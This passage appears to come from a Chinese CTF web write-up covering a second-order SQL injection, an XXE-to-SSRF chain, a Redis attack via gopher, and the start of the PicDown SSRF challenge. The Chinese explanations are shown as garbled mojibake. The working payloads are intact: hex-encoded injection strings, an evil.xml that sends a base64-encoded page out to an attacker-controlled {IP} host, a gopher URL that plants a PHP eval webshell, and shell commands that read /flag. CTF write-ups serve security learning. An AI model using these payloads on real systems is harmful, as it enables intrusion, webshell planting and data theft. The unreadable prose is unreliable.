                                <span class="token variable">$filehash</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;insert into file(filename,filehash,sig) values('&quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;','&quot;</span><span class="token punctuation">.</span><span class="token variable">$filehash</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;',&quot;</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'sig'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;)&quot;</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">:</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'sig'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;)&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token double-quoted-string string">&quot;Failed&quot;</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token variable">$new_filename</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;./upload/&quot;</span><span class="token punctuation">.</span><span class="token variable">$filehash</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.txt&quot;</span><span class="token punctuation">;</span>
                                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$new_filename</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Your file &quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; upload successful.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                                <span class="token variable">$hash</span><span class="token operator">=</span><span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;select filehash from file where filename='&quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token variable">$new_filename</span><span class="token operator">=</span><span class="token double-quoted-string string">&quot;./upload/&quot;</span><span class="token punctuation">.</span><span class="token variable">$hash</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.txt&quot;</span><span class="token punctuation">;</span>
                                <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$new_filename</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Upload failed&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Your file &quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; upload successful.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Not upload file&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>show.php</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token double-quoted-string string">&quot;view&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;REMOTE_ADDR&quot;</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token double-quoted-string string">&quot;127.0.0.1&quot;</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Forbidden.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$file_info</span><span class="token operator">=</span><span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;select * from file where filename='&quot;</span><span class="token punctuation">.</span><span class="token function">w_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$file_name</span><span class="token operator">=</span><span class="token variable">$file_info</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">/</span>
			<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;file code: &quot;</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;./upload/&quot;</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;.txt&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$new_sig</span><span class="token operator">=</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">sql_result</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;update file set sig='&quot;</span><span class="token punctuation">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$new_sig</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;' where id=&quot;</span><span class="token punctuation">.</span><span class="token variable">$file_info</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot; and sig='&quot;</span><span class="token punctuation">.</span><span class="token variable">$file_info</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;'&quot;</span><span class="token punctuation">,</span><span class="token variable">$mysql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;&lt;br&gt;new sig:&quot;</span><span class="token punctuation">.</span><span class="token variable">$new_sig</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Null filename&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>åœ¨function.phpä¸­å¯¹postçš„<code>sig</code>è¿›è¡Œäº†è½¬ä¹‰ï¼Œä½†æ˜¯åœ¨show.phpè¿›è¡Œ<code>update</code>çš„æ—¶å€™å´æ²¡æœ‰è¿›è¡Œè½¬ä¹‰é€ æˆäº†äºŒæ¬¡æ³¨å…¥ï¼š</p> <p><img src="https://i.loli.net/2020/11/16/jZAdYVnwOSJbhLa.png" alt="image-20201116210254571"></p> <p>æ‰€ä»¥æ³¨å…¥ç‚¹å°±åœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™çš„æ•°æ®åŒ…çš„<code>sig</code>å¤„ï¼Œfunction.phpä¸­çš„å‡½æ•°åœ¨submit.phpä¸­è¢«è°ƒç”¨ï¼Œæ‰€ä»¥åœ¨submit.phpä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™æŠ“åŒ…ä¿®æ”¹æ¶æ„çš„sigæ•°æ®ï¼Œç„¶ååœ¨show.phpä¸­æ‹¿flagï¼Œè¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯show.phpåªå…è®¸localhostè®¿é—®ï¼Œæ‰€ä»¥è¿˜éœ€è¦åˆ©ç”¨XXEè¿›è¡ŒSSRFï¼š</p> <p>evil.xml</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1/show.php?action=view&amp;filename=4.php&quot;&gt;
&lt;!ENTITY % all &quot;&lt;!ENTITY <span class="token entity" title="&amp;#37;">&amp;#37;</span> send SYSTEM 'http://{IP}/xxe/test.php?file=%file;'&gt;&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token comment">-- sig</span>
<span class="token comment">-- å¤šä½™çš„å°±ä¸å†™äº†ï¼Œç›´æ¥å†™æœ€åä¸€æ­¥å§</span>

<span class="token string">' and extractvalue(1,concat('</span><span class="token operator">~</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> REVERSE<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span>
<span class="token comment">-- to hex</span>
<span class="token number">0x2720616E64206578747261637476616C756528312C636F6E63617428277E272C2873656C656374205245564552534528666C6167292066726F6D20666C616729292923</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="https://i.loli.net/2020/11/16/lPg6BG9Fx5W7TEN.png" alt="image-20201116211133507"></p> <p>æ³¨æ„ä¸Šä¼ å®Œä¹‹åéœ€è¦å†æ¬¡è¯·æ±‚ä¸€ä¸‹è¿œç¨‹çš„xmlæ–‡ä»¶ï¼š</p> <p><img src="https://i.loli.net/2020/11/16/jK2xqAMLT7tfUS5.png" alt="image-20201116211259552"></p> <p><img src="https://i.loli.net/2020/11/16/DLXanuCxbo62pQw.png" alt="image-20201116211205185"></p> <h2 id="ssrf"><a href="#ssrf" class="header-anchor">#</a> SSRF</h2> <h3 id="ezä¸‰å‰‘å®¢-ezweb"><a href="#ezä¸‰å‰‘å®¢-ezweb" class="header-anchor">#</a> EZä¸‰å‰‘å®¢-EzWeb</h3> <p><strong>è€ƒç‚¹ï¼šåˆ©ç”¨ gopheråè®®æ”»å‡»redisç«¯å£</strong></p> <p>è¿›å…¥é¢˜ç›®ç¯å¢ƒï¼Œé¢˜ç›®è¦æ±‚è¾“å…¥ä¸€ä¸ªurl,æ„Ÿè§‰æ˜¯å¾ˆæ˜æ˜¾çš„SSRFï¼Œå³é”®æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æç¤º</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812224358.png" alt="image-20200812224322507"></p> <p>ä¼ å…¥secretå‚æ•°ï¼Œç»™äº†ä¸€ä¸ªIPåœ°å€ï¼š173.49.220.9</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812224449.png" alt="image-20200812224449287"></p> <p>æäº¤url  <em>http://173.49.220.9</em>  å‡ºç°äº†ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„é¡µé¢</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812225108.png" alt="image-20200812224610989" style="zoom:50%;"> <p>åšä¸€æ³¢å†…ç½‘ä¸»æœºæ¢æµ‹ï¼Œå‘ç°173.49.220.10è¿™å°ä¸»æœºä¸Šè²Œä¼¼æœ‰ä¸œè¥¿</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812225055.png" alt="image-20200812225055412" style="zoom:67%;"> <p>æ ¹æ®æç¤ºï¼Œçˆ†ç ´ä¸€ä¸‹ç«¯å£ï¼Œå‘ç°äº†6379ç«¯å£</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812230930.png" alt="image-20200812225609816" style="zoom:67%;"> <p>6379æ˜¯Redisçš„é»˜è®¤ç«¯å£ï¼Œåˆ©ç”¨gopheråè®®ç›´æ¥å†™shellè¯•ä¸€ä¸‹</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>gopher://173.49.220.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å†™å…¥shellä¹‹åå†æäº¤ <em>http://173.49.220.10/shell.php?cmd=system('ls${IFS}/');</em>   (éœ€è¦ç»•è¿‡ä¸€ä¸‹ç©ºæ ¼)</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812230526.png" alt="image-20200812230512887"></p> <p>å°è¯•è¯»å–flag</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://173.49.220.10/shell.php?cmd=system('cat${IFS}/flag');
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200812230642.png" alt="image-20200812230605779"></p> <h3 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-picdown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-picdown" class="header-anchor">#</a> [ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h3> <p><strong>è€ƒç‚¹ï¼š</strong></p> <ul><li><strong>ç®€å•çš„SSRF</strong></li> <li><strong>linuxç³»ç»ŸçŸ¥è¯†</strong></li> <li><strong>Pythonåå¼¹shell</strong></li></ul> <div class="custom-block tip"><p class="custom-block-title">æç¤º</p> <p>è™½ç„¶æŠŠè¿™é“é¢˜ç›®æ”¾åˆ°äº†SSRFåˆ†ç±»ï¼Œä½†æ˜¯ä¸¥æ ¼æ¥è¯´ï¼Œå¯¹äºè¿™é“é¢˜ç›®SSRFåªèƒ½ç®—æ˜¯ä¸€ä¸ªèµ·ç‚¹ï¼ŒçœŸæ­£é‡è¦çš„æ˜¯å¯¹äºLinuxä¸‹çš„æŸäº›çŸ¥è¯†çš„ç†Ÿæ‚‰ç¨‹åº¦ã€‚</p></div> <p>è¿›å…¥é¢˜ç›®ç¯å¢ƒæ‹¿åˆ°ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œå¹¶ä¸”å‘ç°æäº¤çš„å‚æ•°æ˜¯<code>url</code>ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003220636.png" alt="image-20201003220627131"></p> <p>æ„Ÿè§‰å­˜åœ¨SSRFï¼Œçœ‹è·¯ç”±æ„Ÿè§‰åƒflaskï¼Œè¯»ä¸€ä¸‹æ–‡ä»¶è¯•ä¸€è¯•ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003223924.png" alt="image-20201003220859193"></p> <p>æœ¬æ¥æ‰“ç®—ç”¨<code>local_fileï¼š//</code>æ¥è¯»å–æ–‡ä»¶ï¼Œç»“æœå‘ç°æ²¡ååº”ï¼Œåæ¥æƒ³åˆ°ï¼Œåœ¨python3ç¯å¢ƒä¸‹å¯ä»¥çœç•¥è¯¥åè®®ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003221034.png" alt="image-20201003221034774"></p> <p>è¯»ä¸€ä¸‹<code>app.py</code>ï¼Œæ‹¿åˆ°äº†flaskçš„æºç ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201003221117.png" alt="image-20201003221117082"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
<span class="token keyword">import</span> os
<span class="token keyword">import</span> urllib

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

SECRET_FILE <span class="token operator">=</span> <span class="token string">&quot;/tmp/secret.txt&quot;</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&quot;file&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>
            <span class="token keyword">return</span> response
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            value <span class="token operator">=</span> <span class="token string">&quot;HACK ERROR!&quot;</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        value <span class="token operator">=</span> <span class="token string">&quot;SOMETHING WRONG!&quot;</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;key&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>
    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>
        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;shell&quot;</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token string">&quot;ok&quot;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> <span class="token string">&quot;Wrong Key!&quot;</span>

    <span class="token keyword">return</span> res


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br></div></div><p>ç®€å•é˜…è¯»æºç åï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¸¤ç‚¹ä¿¡æ¯ï¼š</p> <ul><li><code>/page</code>è·¯ç”±ä¸‹å­˜åœ¨<code>urllib.urlopen(url)</code>è¯­å¥ï¼Œä¸”<code>url</code>å‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè¿™æ˜¯SSRFäº§ç”Ÿçš„åŸå› ã€‚</li> <li><code>/no_one_know_the_manager</code>è·¯ç”±ä¸‹ä¼šæ‹¿<code>key</code>å’Œ<code>SECRET_KEY</code>è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ­£ç¡®åˆ™ä¼šæ‰§è¡Œä¼ å…¥çš„<code>shell</code>ï¼Œä¸”æ‰§è¡Œçš„å‘½ä»¤æ˜¯æ²¡æœ‰å›æ˜¾çš„ã€‚</li></ul> <p>æƒ³è¦æ‰§è¡Œå‘½ä»¤ï¼Œå°±è¦å¾—åˆ°<code>SECRET_KEY</code>ï¼Œåœ¨æºç çš„ä¸€å¼€å§‹å°±å‘Šè¯‰äº†å®ƒåœ¨å“ªé‡Œï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>SECRET_FILE <span class="token operator">=</span> <span class="token string">&quot;/tmp/secret.txt&quot;</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
